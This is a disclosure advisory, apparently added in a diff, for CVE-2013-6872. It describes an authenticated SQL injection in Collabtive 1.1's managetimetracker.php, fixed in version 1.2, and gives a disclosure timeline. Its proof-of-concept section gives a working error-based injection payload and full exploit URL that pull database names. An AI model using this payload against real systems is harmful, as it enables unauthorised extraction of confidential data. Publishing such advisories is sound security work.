@@ -1,0 +1,79 @@
+##=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+##
+||                                                                  ||
+|| Advisory           : Collabtive Sql Injection                    ||
+|| Affected Version   : 1.1                                         || 
+|| Vendor             : http://collabtive.o-dyn.de/index.php        || 
+|| Risk               : Medium                                      ||
+|| CVE-ID             : 2013-6872                                   || 
+|| Tested on Platform : Windows 7                                   ||
+##=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+##
+
+==========================================================================================================
+
+Product Description:
+
+
+Collabtive is web-based project management software.
+The project was started in November 2007. It is open source software and provides an alternative to proprietary tools like Basecamp. Collabtive is written in PHP and JavaScript.
+
+Collabtive is intended for small to medium-sized businesses and freelancers. We offer commercial services for installation and customization of Collabtive.
+It can also be installed on an internal server as well as in the cloud. All major browsers like Internet Explorer, Firefox, Chrome and Safari are supported.
+
+Collabtive is developed by a team of professional volunteers. Everyone involved is a pro in their respective areas, providing high quality contributions to the project.
+
+(from product home page)
+
+Collabtive has more than 1000 downloads per week.
+==========================================================================================================
+
+Vulnerability Description:
+
+Double query type of SQL Injection vulnerability has been detected in Collabtive web applivation. Application failed to sanitize user supplied input in parameter "id" of page managetimetracker.php.
+
+User must be authenticated to exploit this vulnerability.
+
+This vulnerability was tested with Collabtive 1.1. Other versions may also be affected. 
+
+===========================================================================================================
+
+Impact:
+
+Successful exploitation of this vulnerability will allow a remote authenticated attacker to extract sensitive and confidential data from the database.
+
+===========================================================================================================
+
+Proof of Concept:
+
+URL: http://www.example.com/collabtive/managetimetracker.php?action=projectpdf&id=2
+
+PAYLOAD: and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+Example:
+
+Following query will show name of first database in error.
+
+http://www.example.com/collabtive/managetimetracker.php?action=projectpdf&id=2 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+===========================================================================================================
+
+Solution:
+
+There's no known workaround available.
+
+This vulnerability has been fixed in version 1.2 of Collabtive.
+
+===========================================================================================================
+
+Disclosure Timeline:
+~Vendor notification: 26th November 2013
+~Vendor response: 27th November 2013
+~Vendor released updates: 4th January 2014
+~Public disclosure: 15th January 2014
+===========================================================================================================
+
+Advisory discovered by: Yogesh Phadtare	
+                        Secur-I Research Group
+                        http://securview.com/ 
+
+                        
+
